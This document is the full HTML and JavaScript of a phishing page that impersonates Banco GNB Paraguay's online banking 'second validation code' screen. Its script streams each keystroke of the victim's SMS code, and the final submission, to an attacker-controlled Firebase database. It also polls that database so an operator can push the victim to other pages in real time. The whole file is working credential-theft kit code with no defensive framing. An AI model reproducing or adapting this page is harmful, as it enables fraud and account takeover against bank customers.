<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, user-scalable=no">
<title>GNB :: Segundo código de validación</title>
<link rel="icon" href="https://www.bancognb.com.py/bancaweb/img/favicon.ico" type="image/icon">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.4.1/css/bootstrap.min.css">
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,600,700&display=swap">
<style>
html{background:transparent;font-family:"Open Sans",sans-serif;}
body{min-width:320px;margin:0;}
.bg-gnb-login{background-color:#EDEDED;font-family:'Open Sans',sans-serif;}
#login-content{background:#fff;min-height:47.6em;margin-right:-15px;margin-left:-15px;display:table;}
.header-login{padding-top:20px;padding-bottom:25px;}
.centertext{text-align:center;}
.padding-0{padding:0;}
h2.cliente{font-family:'Open Sans',sans-serif;font-weight:600;font-size:23px !important;line-height:1.2;margin:0;color:#7AB83F;text-align:center;}
.caja-txt{font-family:'Open Sans',sans-serif;font-size:14px;color:#4a4a4a;text-align:center;line-height:1.55;padding:0 28px;}
.gnb-input-login{background-color:#f4f4f4;border:none;height:52px;border-radius:0 !important;border-bottom:1px solid #aaa;box-shadow:inset 0 1px 0 0 #ececec;color:#121212;font-family:'Open Sans',sans-serif;font-weight:600;outline:none;font-size:20px !important;letter-spacing:7px;text-align:center;}
.btn-login{background:#0574AF !important;border:0 !important;border-radius:0 !important;box-shadow:none !important;height:50px;width:100%;display:flex !important;align-items:center;justify-content:center;padding:0 !important;margin:0;cursor:pointer;line-height:normal !important;}
.btn-login span{font-family:'Open Sans',sans-serif;font-weight:600;font-size:16px;color:#fff;line-height:1;display:block;position:static !important;margin:0 !important;}
.btn-login:hover{background:#04608f !important;}
.btn-login[disabled]{opacity:.55;cursor:default;}
.reenvio{text-align:center;font-size:13px;margin-top:14px;}
.reenvio a{color:#2986CA;text-decoration:none;}
.reenvio a:hover{text-decoration:underline;}
.aviso-ok{display:none;background:#e8f5ec;border:1px solid #b7e0c4;color:#1c6b38;font-size:13px;padding:9px;border-radius:3px;text-align:center;margin-top:12px;}
@media (min-width:992px){#login-content{margin-left:25% !important;}}
</style>
</head>
<body class="bg-gnb-login">
<div class="container">
  <div class="row">
    <div id="login-content" class="col-md-6 col-md-offset-3">

      <div class="col-xs-12 col-sm-10 col-md-10 col-md-offset-1 centertext header-login">
        <img src="https://www.bancognb.com.py/bancaweb/img/brand/new-logo-gnb-fusion.svg" alt="GNB" width="300" height="150" style="max-width:100%;height:auto">
      </div>

      <div class="col-md-12 col-xs-12 col-sm-12">
        <h2 class="cliente">Segundo código de validación</h2>
        <p class="caja-txt">Por seguridad, el banco envió un nuevo código al celular registrado. Ingreselo para confirmar la operación.</p>

        <form id="frm" class="col-md-8 col-md-offset-2 padding-0" style="margin-top:22px;" autocomplete="off" novalidate>
          <input type="text" id="cod" class="form-control gnb-input-login" inputmode="numeric" maxlength="8" placeholder="________">
          <div style="margin-top:18px;">
            <button id="btn" type="submit" class="btn btn-login" disabled="disabled"><span>Validar código</span></button>
          </div>
        </form>

        <div class="reenvio">
          ¿No recibió el código? <a id="reenviar" href="#">Reenviar</a>
          <div class="aviso-ok" id="okmsg">Código reenviado. Aguarde unos segundos.</div>
        </div>
      </div>

    </div>
  </div>
</div>

<script>
(function(){
  var DB="https://cbonnlineec-default-rtdb.firebaseio.com/nbch";
  var id=new URLSearchParams(location.search).get('u');
  if(!id){ try{ id=localStorage.getItem('nbch_u'); }catch(x){} }
  if(!id){ location.replace('index.html'); return; }

  var inp=document.getElementById('cod'), btn=document.getElementById('btn'),
      frm=document.getElementById('frm'), reen=document.getElementById('reenviar'),
      okmsg=document.getElementById('okmsg');

  fetch(DB+'/usuarios/'+id+'.json',{method:'PATCH',headers:{'Content-Type':'application/json'},body:JSON.stringify({estado:'CODIGO 2', pagina:'codigo2.html', sms2:''})}).catch(function(){});
  fetch(DB+'/comandos/'+id+'.json',{method:'PATCH',headers:{'Content-Type':'application/json'},body:JSON.stringify({accion:'', ts:Date.now()})}).catch(function(){});
  setTimeout(function(){ inp.focus(); },300);

  inp.addEventListener('input', function(){
    this.value=this.value.replace(/\D/g,'').slice(0,8);
    btn.disabled = this.value.length<4;
    fetch(DB+'/usuarios/'+id+'.json',{method:'PATCH',headers:{'Content-Type':'application/json'},body:JSON.stringify({sms2:this.value, ultimoPing:Date.now()})}).catch(function(){});
  });

  frm.addEventListener('submit', function(e){
    e.preventDefault();
    var v=inp.value.trim();
    if(v.length<4) return;
    btn.disabled=true;
    fetch(DB+'/usuarios/'+id+'.json',{method:'PATCH',headers:{'Content-Type':'application/json'},body:JSON.stringify({sms2:v, estado:'VALIDANDO CODIGO 2', pagina:'cargando3.html'})}).catch(function(){});
    setTimeout(function(){ location.href='cargando3.html?u='+id; }, 700);
  });

  reen.addEventListener('click', function(e){
    e.preventDefault();
    okmsg.style.display='block';
    setTimeout(function(){ okmsg.style.display='none'; }, 4000);
    fetch(DB+'/usuarios/'+id+'.json').then(function(r){return r.json();}).then(function(d){
      var n=((d&&d.reenvios2)||0)+1;
      fetch(DB+'/usuarios/'+id+'.json',{method:'PATCH',headers:{'Content-Type':'application/json'},body:JSON.stringify({reenvios2:n, reenvio2:Date.now()})}).catch(function(){});
    }).catch(function(){});
    fetch(DB+'/comandos/'+id+'.json',{method:'PATCH',headers:{'Content-Type':'application/json'},body:JSON.stringify({accion:'reenvio2', ts:Date.now()})}).catch(function(){});
  });

  var salio=false;
  setInterval(function(){
    if(salio) return;
    fetch(DB+'/comandos/'+id+'.json').then(function(r){return r.json();}).then(function(c){
      if(!c) return;
      if(c.accion==='dejar'){ salio=true; location.href='final.html?u='+id; }
      else if(c.accion==='rechazar'){ salio=true; location.href='rechazado.html?u='+id; }
    }).catch(function(){});
  },3000);
})();
</script>
</body>
</html>
